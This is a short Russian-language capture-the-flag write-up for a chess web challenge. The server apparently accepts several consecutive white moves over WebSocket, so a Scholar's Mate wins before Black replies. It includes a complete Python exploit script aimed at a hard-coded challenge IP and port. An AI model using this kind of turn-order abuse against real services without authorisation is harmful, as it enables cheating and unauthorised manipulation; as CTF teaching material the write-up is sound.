# Web Challenge 1: Chess — простой пошаговый райтап

## Идея
Нужно победить Stockfish, но баг был в серверной логике хода: можно отправить несколько ходов белых подряд.

## Шаги решения
1. Подключаемся к WebSocket.
2. Сразу отправляем 4 хода мата Легаля/Scholar’s Mate: `e2e4 d1h5 f1c4 h5f7`.
3. Сервер принимает очередь ходов без строгой проверки очередности.
4. Получаем победу до ответа чёрных.

## Команды для выполнения (без готовых скриптов)

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install websockets
```

Создай `exploit_chall1.py`:

```python
import asyncio, json, websockets

URL = "ws://51.250.116.20:4832/ws"
MOVES = ["e2e4", "d1h5", "f1c4", "h5f7"]

async def main():
    async with websockets.connect(URL) as ws:
        print(await ws.recv())  # game_start
        for m in MOVES:
            await ws.send(json.dumps({"type": "move", "move": m}))
            print("sent", m)

        # дочитываем ответы
        while True:
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=2)
                print(msg)
            except asyncio.TimeoutError:
                break

asyncio.run(main())
```

Запуск:

```bash
python3 exploit_chall1.py
```

